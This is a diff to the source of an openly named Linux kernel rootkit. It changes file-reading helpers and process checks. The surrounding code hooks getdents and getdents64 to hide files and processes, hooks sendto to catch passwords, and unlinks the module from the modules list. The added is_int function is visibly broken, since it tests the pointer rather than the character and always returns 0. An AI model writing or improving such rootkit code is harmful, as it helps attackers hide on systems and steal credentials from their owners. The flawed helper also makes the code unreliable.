@@ -15,6 +15,7 @@
 
 #define BEGIN_BUF_SIZE 10000
 #define LOG_SEPARATOR "\n.............................................................\n"
+#define CMDLINE_SIZE 1000
 
 //configuration
 #define FILE_SUFFIX ".rootkit"
@@ -116,6 +117,7 @@ char *read_whole_file(struct file *f, int *return_read)
 	int res;
 	int read = 0;
 	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
+	char *buf_old=NULL;
 	if (buf == NULL)
 		return NULL;
 
@@ -123,20 +125,40 @@ char *read_whole_file(struct file *f, int *return_read)
 	while (res > 0) {
 		read += res;
 		if (read == buf_size) {
-			char *new_buf = kzalloc(buf_size * 2 + 1, GFP_KERNEL);
-			if (new_buf == NULL) {
-				kfree(buf);
-				return NULL;
-			}
-			memcpy(new_buf, buf, buf_size);
 			buf_size = buf_size * 2;
-			kfree(buf);
-			buf = new_buf;
+			buf_old=buf;
+			buf=krealloc(buf,buf_size+1,GFP_KERNEL);
+			if(buf==NULL)
+			{
+			  kfree(buf_old); //https://tapaswenipathak.wordpress.com/2015/01/13/faults-in-linux-kernel-3-x-wrong-use-of-krealloc/
+			  return NULL;
+			}
 		}
 		res = file_read(f, read, buf + read, buf_size - read);
 	}
 	if (return_read)
 		*return_read = read;
+	buf[read]=0;
+	return buf;
+}
+
+char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
+{
+	int buf_size = n;
+	int res;
+	int read = 0;
+	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
+	if (buf == NULL)
+		return NULL;
+
+	res = file_read(f, read, buf + read, buf_size - read);
+	while (res > 0) {
+		read += res;
+		res = file_read(f, read, buf + read, buf_size - read);
+	}
+	if (return_read)
+		*return_read = read;
+	buf[read]=0;
 	return buf;
 }
 
@@ -161,6 +183,17 @@ int check_file_suffix(const char *name)	//checks if file ends on suffix
 	return 0;
 }
 
+int is_int(const char *data)
+{
+	while(data)
+	{
+	      if(*data<'0' || *data>'9')
+		return 0;
+	      data++;
+	}
+	return 0;
+}
+
 int check_process_prefix(const char *name)
 {
 	int err;
@@ -172,11 +205,14 @@ int check_process_prefix(const char *name)
 	int read;
 	int i;
 
+	if(!is_int(name))
+		goto end_;
+
 	err = kstrtol(name, 10, &pid);
 	if (err != 0)
 		goto end_;
 
-	path = kzalloc(strlen("/proc/") + strlen(name) + strlen("cmdline") + 1,
+	path = kzalloc(strlen("/proc/") + strlen(name) + strlen("/cmdline") + 1,
 	    GFP_KERNEL);
 	if (path == NULL)
 		goto end_;
@@ -189,7 +225,10 @@ int check_process_prefix(const char *name)
 	if (f == NULL)
 		goto end_;
 
-	buf = read_whole_file(f, &read);
+	buf = read_n_bytes_of_file(f, CMDLINE_SIZE, &read);
+
+	if(buf==NULL)
+		goto end_;
 
 	for (i = 0; i < read; i++) {
 		if (buf[i] == 0)
@@ -223,7 +262,6 @@ int should_be_hidden(const char *name)
 asmlinkage long new_sys_getdents(unsigned int fd,
     struct linux_dirent __user * dirent, unsigned int count)
 {
-	//printk(KERN_DEBUG "getdents start\n");
 	long read;
 	long bpos;
 	struct linux_dirent __user *d;
@@ -261,7 +299,7 @@ asmlinkage long new_sys_getdents(unsigned int fd,
 asmlinkage long new_sys_getdents64(unsigned int fd,
     struct linux_dirent64 __user * dirent, unsigned int count)
 {
-	//printk(KERN_DEBUG "getdents64 start\n");
+	//printk(KERN_INFO "getdents64 start\n");
 	long read;
 	long bpos;
 	struct linux_dirent64 __user *d;
@@ -372,7 +410,7 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 {
 	long ret;
 
-	//printk(KERN_DEBUG "sendto start\n");
+	//printk(KERN_INFO "sendto start\n");
 
 	if (password_found(buff, len)) {
 		printk(KERN_INFO "password found\n");
@@ -438,6 +476,7 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 			kfree(new_path);
 			return ref_sys_open(filename, flags, mode);
 		}
+
 		//remove rootkit from modules list
 		rootkit = strstr(modules_buf, ROOTKIT_NAME);
 		if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
